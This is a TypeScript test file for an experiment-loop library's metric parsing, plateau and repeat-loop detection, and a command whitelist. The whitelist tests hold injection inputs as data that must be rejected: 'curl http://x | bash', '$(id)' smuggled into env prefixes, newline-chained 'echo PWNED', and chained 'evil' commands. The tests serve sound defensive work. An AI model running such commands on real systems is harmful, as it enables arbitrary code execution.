import { test } from "node:test";
import assert from "node:assert/strict";
import {
  parseMetricLines,
  isBetter,
  computeConfidence,
  unwrapMeasureCommand,
  isStopReached,
  detectPlateau,
  median,
  normalizeHypothesis,
  hypothesesSimilar,
  directionLabel,
  detectDoomLoop,
} from "../mcp/lib/experiment.ts";

test("parseMetricLines extracts METRIC name=value lines", () => {
  const out = [
    "some log line",
    "METRIC time_ms=42",
    "METRIC time_ms=43", // last wins
    "METRIC bytes=128",
    "not a metric",
  ].join("\n");
  const { metrics, primary } = parseMetricLines(out, "time_ms");
  assert.equal(metrics.time_ms, 43);
  assert.equal(metrics.bytes, 128);
  assert.equal(primary, 43);
});

test("parseMetricLines rejects dangerous keys and non-numbers", () => {
  const { metrics, primary } = parseMetricLines(
    "METRIC __proto__=1\nMETRIC constructor=2\nMETRIC ok=abc\nMETRIC n=3",
    "n",
  );
  assert.deepEqual(Object.keys(metrics), ["n"]);
  assert.equal(metrics.n, 3);
  assert.equal(primary, 3);
});

test("parseMetricLines returns primary undefined when metric not seen", () => {
  const { primary } = parseMetricLines("METRIC other=1\n", "time_ms");
  assert.equal(primary, undefined);
});

test("parseMetricLines accepts hyphenated metric names", () => {
  // p95-style names are common; the name charset must not silently drop them.
  const { metrics, primary } = parseMetricLines(
    "METRIC tokens-per-sec=128\nMETRIC time_ms=42",
    "tokens-per-sec",
  );
  assert.deepEqual(metrics, { "tokens-per-sec": 128, time_ms: 42 });
  assert.equal(primary, 128);
});

test("parseMetricLines surfaces near-miss METRIC lines for loud diagnostics", () => {
  // A silently dropped primary metric only surfaces later as a confusing
  // keep-gate error; near-misses are collected so the server can log them.
  const { metrics, primary, nearMisses } = parseMetricLines(
    "METRIC time_ms=abc\nMETRIC =5\nMETRIC ok=1\nnot a metric",
    "ok",
  );
  assert.deepEqual(nearMisses, ["METRIC time_ms=abc", "METRIC =5"]);
  assert.deepEqual(metrics, { ok: 1 });
  assert.equal(primary, 1);
});

test("isBetter is direction-aware", () => {
  assert.equal(isBetter(41, 42, "lower"), true);
  assert.equal(isBetter(42, 42, "lower"), false);
  assert.equal(isBetter(43, 42, "higher"), true);
  assert.equal(isBetter(41, 42, "higher"), false);
  assert.equal(isBetter(null, 42, "lower"), false);
});

test("computeConfidence uses MAD noise floor", () => {
  // tight cluster -> high confidence in a real delta
  const c = computeConfidence({
    values: [10, 10.1, 9.9, 10, 10.05],
    baseline: 10,
    best: 14,
  });
  assert.ok(c);
  assert.equal(c.level, "green");
  // delta within noise -> red
  const c2 = computeConfidence({
    values: [10, 15, 5, 12, 8],
    baseline: 10,
    best: 10.5,
  });
  assert.ok(c2);
  assert.equal(c2.level, "red");
  // too few points -> null
  assert.equal(
    computeConfidence({ values: [10, 11], baseline: 10, best: 9 }),
    null,
  );
});

// Regression (worth-fix 2026-11-11, segment dota2-logloss run 6): on a
// deterministic benchmark the pooled outcome spread across experiments is
// effect size, not measurement noise — a bitwise-exact keep was reported as
// "yellow 1.5× noise" and the loop was nudged into pointless repeat
// re-measurement (which plateauHintText already declines for the same
// benchmark). Deterministic input has a single-point noise band: any delta is
// exact signal, so no confidence ratio is reported.
test("computeConfidence returns null for a deterministic benchmark", () => {
  const values = [0.662184, 0.664594, 0.662466, 0.662506, 0.662421, 0.661943];
  const pooled = computeConfidence({
    values,
    baseline: 0.662184,
    best: 0.661943,
  });
  assert.ok(pooled);
  assert.equal(pooled.level, "yellow");
  assert.equal(
    computeConfidence({
      values,
      baseline: 0.662184,
      best: 0.661943,
      deterministic: true,
    }),
    null,
  );
});

test("unwrapMeasureCommand allows the benchmark script with wrappers", () => {
  assert.equal(
    unwrapMeasureCommand(".auto/measure.sh", "measure.sh"),
    ".auto/measure.sh",
  );
  assert.equal(
    unwrapMeasureCommand("bash .auto/measure.sh", "measure.sh"),
    "bash .auto/measure.sh",
  );
  // wrappers and env assignments are stripped; the returned command is the unwrapped core
  assert.equal(
    unwrapMeasureCommand("time bash .auto/measure.sh", "measure.sh"),
    "bash .auto/measure.sh",
  );
  assert.equal(
    unwrapMeasureCommand("FOO=1 bar=2 env nice .auto/measure.sh", "measure.sh"),
    ".auto/measure.sh",
  );
  assert.equal(
    unwrapMeasureCommand("env X=1 bash .auto/measure.sh", "measure.sh"),
    "bash .auto/measure.sh",
  );
});

// Regression (evidence 2026-11-04): the assignment-prefix strip used an
// unchecked `\S*` value, so `X=$(id) bash .auto/measure.sh` passed the lock
// while bash executed the substitution in the prefix. The value now goes
// through the same character whitelist as script args.
test("unwrapMeasureCommand rejects command substitution in assignment prefixes", () => {
  assert.equal(
    unwrapMeasureCommand("X=$(id) bash .auto/measure.sh", "measure.sh"),
    null,
  );
  assert.equal(
    unwrapMeasureCommand("X=`id` bash .auto/measure.sh", "measure.sh"),
    null,
  );
  assert.equal(
    unwrapMeasureCommand("env X=$(id) bash .auto/measure.sh", "measure.sh"),
    null,
  );
  assert.equal(unwrapMeasureCommand("X=$(id); evil", "measure.sh"), null);
  assert.equal(
    unwrapMeasureCommand('X="quoted" bash .auto/measure.sh', "measure.sh"),
    null,
  );
  // benign prefixes still pass (whitelist chars: word . / : = + -)
  assert.equal(
    unwrapMeasureCommand("FOO=a+b/c:d=e bash .auto/measure.sh", "measure.sh"),
    "bash .auto/measure.sh",
  );
});

test("unwrapMeasureCommand rejects non-benchmark or chained commands", () => {
  assert.equal(unwrapMeasureCommand("ls", "measure.sh"), null);
  assert.equal(unwrapMeasureCommand("measure.sh; evil", "measure.sh"), null);
  assert.equal(
    unwrapMeasureCommand("evil; .auto/measure.sh", "measure.sh"),
    null,
  );
  assert.equal(
    unwrapMeasureCommand("curl http://x | bash", "measure.sh"),
    null,
  );
  assert.equal(
    unwrapMeasureCommand("bash -c 'measure.sh'", "measure.sh"),
    null,
  );
  assert.equal(unwrapMeasureCommand("", "measure.sh"), null);
  assert.equal(unwrapMeasureCommand(null, "measure.sh"), null);
});

test("unwrapMeasureCommand rejects shell injection after the script (whitelist)", () => {
  // newline / CR chaining
  assert.equal(
    unwrapMeasureCommand("bash .auto/measure.sh \necho PWNED", "measure.sh"),
    null,
  );
  assert.equal(
    unwrapMeasureCommand("bash .auto/measure.sh \recho PWNED", "measure.sh"),
    null,
  );
  // redirection (relative fixture target — the repo keeps absolute-path literals out of its tree)
  assert.equal(
    unwrapMeasureCommand("bash .auto/measure.sh > out.txt", "measure.sh"),
    null,
  );
  // backtick / dollar / quotes / glob
  assert.equal(
    unwrapMeasureCommand("bash .auto/measure.sh `id`", "measure.sh"),
    null,
  );
  assert.equal(
    unwrapMeasureCommand("bash .auto/measure.sh $HOME", "measure.sh"),
    null,
  );
  assert.equal(
    unwrapMeasureCommand('bash .auto/measure.sh --name="a b"', "measure.sh"),
    null,
  );
  assert.equal(
    unwrapMeasureCommand("bash .auto/measure.sh *.js", "measure.sh"),
    null,
  );
});

test("unwrapMeasureCommand allows plain benchmark args (whitelist)", () => {
  assert.equal(
    unwrapMeasureCommand("bash .auto/measure.sh --verbose", "measure.sh"),
    "bash .auto/measure.sh --verbose",
  );
  assert.equal(
    unwrapMeasureCommand("bash .auto/measure.sh --foo=bar -n 3", "measure.sh"),
    "bash .auto/measure.sh --foo=bar -n 3",
  );
  assert.equal(
    unwrapMeasureCommand(
      "bash .auto/measure.sh --input=./data/a_b-c.txt:2 +x",
      "measure.sh",
    ),
    "bash .auto/measure.sh --input=./data/a_b-c.txt:2 +x",
  );
});

test("isStopReached on cap and consecutive failures", () => {
  const runs = [1, 2, 3].map((n) => ({ run: n, status: "keep" }));
  assert.equal(isStopReached(runs, 3), true);
  assert.equal(isStopReached(runs, 10), false);
  const fails = [
    { status: "discard" },
    { status: "crash" },
    { status: "discard" },
  ];
  assert.equal(isStopReached(fails, 20), true);
  assert.equal(
    isStopReached([{ status: "keep" }, { status: "discard" }], 20),
    false,
  );
  assert.equal(isStopReached([], 20), false);
});

test("detectPlateau flags no net improvement within the window", () => {
  // flat: best 4.08 vs first 4.1 → 0.49% < 1% → plateau
  const flat = [
    { metric: 4.1 },
    { metric: 4.1 },
    { metric: 4.08 },
    { metric: 4.12 },
    { metric: 4.09 },
  ];
  assert.equal(detectPlateau(flat, { window: 5, minImprovement: 0.01 }), true);
  // improving: best 4.0 vs first 4.1 → 2.4% > 1% → not a plateau
  const improving = [
    { metric: 4.1 },
    { metric: 4.1 },
    { metric: 4.0 },
    { metric: 4.0 },
    { metric: 4.0 },
  ];
  assert.equal(
    detectPlateau(improving, { window: 5, minImprovement: 0.01 }),
    false,
  );
});

test("detectPlateau respects direction and short windows", () => {
  // higher, 3% improvement < 5% threshold → plateau
  const small = [
    { metric: 100 },
    { metric: 101 },
    { metric: 102 },
    { metric: 101 },
    { metric: 103 },
  ];
  assert.equal(
    detectPlateau(small, {
      window: 5,
      minImprovement: 0.05,
      direction: "higher",
    }),
    true,
  );
  // higher, 6% improvement > 5% threshold → not plateau
  const big = [
    { metric: 100 },
    { metric: 101 },
    { metric: 102 },
    { metric: 104 },
    { metric: 106 },
  ];
  assert.equal(
    detectPlateau(big, {
      window: 5,
      minImprovement: 0.05,
      direction: "higher",
    }),
    false,
  );
  // fewer than window valid records → not judged
  assert.equal(
    detectPlateau([{ metric: 1 }, { metric: 1 }], { window: 5 }),
    false,
  );
  // zero baseline falls back to absolute difference
  assert.equal(
    detectPlateau(
      [
        { metric: 0 },
        { metric: 0 },
        { metric: 0.001 },
        { metric: 0 },
        { metric: 0 },
      ],
      { window: 5, minImprovement: 0.01 },
    ),
    true,
  );
});

test("detectPlateau deterministic: no-progress counting, not magnitude", () => {
  // Real-world evidence (ml-auto adult-auprc seg2): a 5-run window holding a
  // keep (+0.00095 ≈ 0.11% relative) was flagged as a plateau by the 1%
  // magnitude threshold. Counting semantics: the window's keep beats the
  // pre-window best → progress → not a plateau, at any metric scale.
  const seg2 = [
    { status: "noop", metric: 0.82922 },
    { status: "discard", metric: 0.828402 },
    { status: "discard", metric: 0.824887 },
    { status: "keep", metric: 0.83017 },
    { status: "discard", metric: 0.826868 },
  ];
  assert.equal(
    detectPlateau(seg2, {
      window: 5,
      minImprovement: 0.01,
      direction: "higher",
      deterministic: true,
    }),
    false,
  );
  // an event at the window's first element counts too: it beats the
  // pre-window best (why the event scan runs over the full history while
  // only the event lookup is windowed)
  const enteringKeep = [
    { status: "noop", metric: 0.82922 },
    { status: "discard", metric: 0.828402 },
    { status: "keep", metric: 0.83017 },
    { status: "discard", metric: 0.8298 },
    { status: "discard", metric: 0.8295 },
    { status: "discard", metric: 0.8294 },
  ];
  assert.equal(
    detectPlateau(enteringKeep, {
      window: 5,
      minImprovement: 0.01,
      direction: "higher",
      deterministic: true,
    }),
    false,
  );
  // five consecutive runs without beating the best → plateau, whatever the
  // magnitude differences are
  const stalled = [
    { status: "noop", metric: 0.83017 },
    { status: "discard", metric: 0.828402 },
    { status: "discard", metric: 0.824887 },
    { status: "discard", metric: 0.827859 },
    { status: "discard", metric: 0.829342 },
  ];
  assert.equal(
    detectPlateau(stalled, {
      window: 5,
      minImprovement: 0.01,
      direction: "higher",
      deterministic: true,
    }),
    true,
  );
  // crash rows stay excluded from the window even when they sit inside it:
  // a crash between flat runs neither creates an event nor extends the wait
  const withCrash = [
    { status: "noop", metric: 50.1 },
    { status: "discard", metric: 50 },
    { status: "crash", metric: null },
    { status: "discard", metric: 50 },
    { status: "discard", metric: 50 },
    { status: "discard", metric: 50 },
    { status: "discard", metric: 50 },
    { status: "discard", metric: 50 },
  ];
  assert.equal(
    detectPlateau(withCrash, {
      window: 5,
      minImprovement: 0.01,
      direction: "lower",
      deterministic: true,
    }),
    true,
    "crash excluded → the last 5 valid runs are all non-improving → plateau",
  );
});

test("median returns the middle value", () => {
  assert.equal(median([42, 44, 41]), 42);
  assert.equal(median([5, 1, 3, 2, 4]), 3);
  assert.equal(median([]), null);
});

test("normalizeHypothesis ignores wording differences", () => {
  assert.equal(
    normalizeHypothesis("Try the sieve of Eratosthenes"),
    normalizeHypothesis("the sieve of eratosthenes, try!"),
  );
  assert.equal(normalizeHypothesis("x"), null); // too little signal
});

test("directionLabel takes hypothesis, else description clause", () => {
  assert.equal(
    directionLabel({
      asi: { hypothesis: "sieve" },
      description: "long description here",
    }),
    "sieve",
  );
  assert.equal(
    directionLabel({ description: "try sqrt cutoff, then measure" }),
    "try sqrt cutoff",
  );
  assert.equal(directionLabel({ status: "keep" }), "keep");
});

test("directionLabel keeps decimals intact (dot is not a clause boundary)", () => {
  // 2026-11-05, ml-auto dota2-wave1: the old split treated the half-width
  // period as a clause boundary, so the memory injection presented
  // "bagging_fraction 0" / "lambda_l2 1" / "lr 0" as tried directions.
  assert.equal(
    directionLabel({
      asi: {
        hypothesis:
          "bagging_fraction 0.8 + bagging_freq 1：行采样方差缩减在 dota2 灵敏",
      },
    }),
    "bagging_fraction 0.8 + bagging_freq 1：行采…", // 40-cap still applies, dot intact
  );
  assert.equal(
    directionLabel({ asi: { hypothesis: "lambda_l2 1.0：正则" } }),
    "lambda_l2 1.0：正则",
  );
  assert.equal(
    directionLabel({ asi: { hypothesis: "lr 0.05 x n_estimators 600" } }),
    "lr 0.05 x n_estimators 600",
  );
  // real clause boundaries still split
  assert.equal(
    directionLabel({ asi: { hypothesis: "lr 0.05；然后看 600" } }),
    "lr 0.05",
  );
});

test("detectDoomLoop flags repeats and oscillation, not normal progress", () => {
  const run = (d: string) => ({ description: d });
  // oscillation A→B→A→B
  assert.equal(
    detectDoomLoop([
      run("sieve approach"),
      run("bitpacking"),
      run("sieve approach v2"),
      run("bitpacking v2"),
    ])?.pattern,
    "oscillate",
  );
  // 3 consecutive repeats
  assert.equal(
    detectDoomLoop([
      run("a"),
      run("try the sieve"),
      run("try the sieve again"),
      run("try the sieve once more"),
    ])?.pattern,
    "repeat",
  );
  // normal progression → null
  assert.equal(
    detectDoomLoop([
      run("baseline"),
      run("sqrt cutoff"),
      run("sieve"),
      run("odds-only sieve"),
    ]),
    null,
  );
  // too few runs → null
  assert.equal(detectDoomLoop([run("a"), run("a")]), null);
});

test("detectDoomLoop ignores infra-failure rows when scanning the window", () => {
  const run = (d: string, infra?: boolean) => ({
    description: d,
    ...(infra ? { asi: { infra: true } } : {}),
  });
  // The same hypothesis crashing over and over with asi.infra: true (network
  // outage retries) is environment noise, not the agent thrashing.
  assert.equal(
    detectDoomLoop([
      run("try the sieve", true),
      run("try the sieve", true),
      run("try the sieve", true),
      run("try the sieve", true),
    ]),
    null,
  );
  // Infra rows are removed before the window is taken, so a real repeat
  // interleaved with infra noise still triggers.
  assert.equal(
    detectDoomLoop([
      run("try the sieve", true),
      run("try the sieve"),
      run("try the sieve"),
      run("try the sieve"),
    ])?.pattern,
    "repeat",
  );
  // Non-infra oscillation keeps the existing behavior.
  assert.equal(
    detectDoomLoop([
      run("sieve approach"),
      run("bitpacking"),
      run("sieve approach v2"),
      run("bitpacking v2"),
    ])?.pattern,
    "oscillate",
  );
});

test("isStopReached: noop neither counts as a failure nor keeps the streak", () => {
  const mk = (status: string) => ({ status });
  // [discard, crash, noop]: trailing failure streak is 0 — no stop
  assert.equal(
    isStopReached(
      [mk("discard"), mk("crash"), mk("noop")].map((r, i) => ({
        ...r,
        run: i + 1,
      })),
      20,
    ),
    false,
  );
  // [discard, crash, noop, discard]: streak restarts at 1 — no stop
  assert.equal(
    isStopReached(
      [mk("discard"), mk("crash"), mk("noop"), mk("discard")].map((r, i) => ({
        ...r,
        run: i + 1,
      })),
      20,
    ),
    false,
  );
  // three real failures in a row still stop
  assert.equal(
    isStopReached(
      [mk("discard"), mk("crash"), mk("checks_failed")].map((r, i) => ({
        ...r,
        run: i + 1,
      })),
      20,
    ),
    true,
  );
  // all noop never stops
  assert.equal(
    isStopReached(
      [mk("noop"), mk("noop"), mk("noop"), mk("noop")].map((r, i) => ({
        ...r,
        run: i + 1,
      })),
      20,
    ),
    false,
  );
});

test("CJK hypotheses without spaces dedupe and trigger doom-loop", () => {
  assert.equal(
    hypothesesSimilar(
      normalizeHypothesis("试埃氏筛"),
      normalizeHypothesis("试埃氏筛变体"),
    ),
    true,
  );
  assert.equal(
    hypothesesSimilar(
      normalizeHypothesis("试 sqrt 截断"),
      normalizeHypothesis("试 sqrt 截断变体"),
    ),
    true,
  );

  const runs = ["试埃氏筛", "试位运算", "试埃氏筛变体", "试位运算变体"].map(
    (description, i) => ({
      run: i + 1,
      status: "discard",
      metric: 10,
      description,
    }),
  );
  assert.equal(detectDoomLoop(runs)?.pattern, "oscillate");
});

// Regression (worth-fix 2026-11-07): a crash row carrying a legacy 0
// placeholder must not enter the plateau window. With the row included, the
// window's first value becomes 0 and the flat real values look like a 10×
// "improvement" (plateau false); excluded, the flat window correctly plateaus.
test("detectPlateau excludes crash rows (legacy placeholders are not data points)", () => {
  const rows = [
    { run: 1, status: "keep", metric: 10 },
    { run: 2, status: "crash", metric: 0 }, // pre-ADR-10 placeholder
    { run: 3, status: "keep", metric: 10 },
    { run: 4, status: "keep", metric: 10 },
    { run: 5, status: "keep", metric: 10 },
    { run: 6, status: "keep", metric: 10 },
  ];
  assert.equal(detectPlateau(rows, { window: 5, minImprovement: 0.01 }), true);
});
